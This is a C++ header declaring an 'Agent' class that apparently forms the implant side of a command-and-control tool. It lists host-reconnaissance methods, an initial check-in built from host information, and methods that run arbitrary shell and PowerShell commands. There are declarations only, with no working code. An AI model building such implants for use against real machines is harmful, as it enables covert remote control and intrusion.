#pragma once
#include <string>
#include "CommManager.h"
#include "TaskQueueManager.h"
#ifdef _WIN32
#include <windows.h>
#endif

class Agent {
public:
	Agent(CommManager commManager, TaskQueueManager taskManager);
	void Start();

	// Host metadata commands 
	BOOL GetUsername(OUT LPWSTR* szWhoamiStr);
	std::string GetInternalIP();
	std::string GetExternalViaDNS();
	int GetPID();
	std::string GetProcessName();
	std::string GetMachineMacAddress();
	std::string GetMotherBoard();
	int GetRAM();
	int GetOSVersion();
	void GetTotalDiskSize(OUT double* total, OUT double* free);
	int GetCpuCount();
	IntitalCheckinRequest GetHostInformation();

	// Agent base commands
	void Exit();
	std::string GetUID();
	std::string ExecutePowerShell(const std::string& command);
	std::string ExecuteShell(const std::string& command);
private:
	CommManager commManager;
	TaskQueueManager taskManager;
	std::string CaptureCommandOutput(const std::string& cmd);
};